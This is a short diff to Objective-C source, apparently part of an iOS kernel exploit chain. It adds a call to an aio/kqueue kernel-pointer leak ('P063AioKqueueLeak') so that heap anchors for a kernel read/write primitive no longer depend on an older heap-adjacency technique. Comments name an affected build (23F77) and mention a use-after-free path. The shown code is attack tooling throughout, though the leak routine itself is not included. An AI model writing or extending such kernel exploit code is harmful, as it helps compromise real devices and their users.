@@ -7,6 +7,7 @@
 //
 #import "LabHeapAnchor.h"
 #import "P159IOSurfaceAdjacency.h"
+#import "P063AioKqueueLeak.h"
 #import <Foundation/Foundation.h>
 #import <sys/sysctl.h>
 
@@ -107,6 +108,16 @@ int LabHeapAnchorsSameBoot(int max, uint64_t *out) {
 int LabHeapAnchorHarvestIfThin(int want) {
     uint64_t buf[8];
     int have = LabHeapAnchorsSameBoot(8, buf);
+    if (have >= want) return have;
+    /* 2026-11-20: the aio84530 leak is DETERMINISTIC on 23F77 — every
+       kqueue-extinfo dump round shows the aio_workq_entry kptr (receipt
+       2026-11-19 23:43, board 0xffffffe1d3431900). Harvest it FIRST so the
+       KRW anchor supply stops depending on the p159 adjacency lottery.
+       Read-only leak probe (fifo + SIGEV_KEVENT + extinfo dump — no close
+       races, not the UAF churn). On fixed trains (27.x) it records nothing
+       and the p159 lottery below stays the fallback. */
+    (void)[P063AioKqueueLeak tap];
+    have = LabHeapAnchorsSameBoot(8, buf);
     if (have >= want) return have;
     /* 2026-11-19 receipt: ONE harvest tap yields nothing on the sparse 17
        (the user's manual rhythm was "tap p159 a few times"). Two attempts,
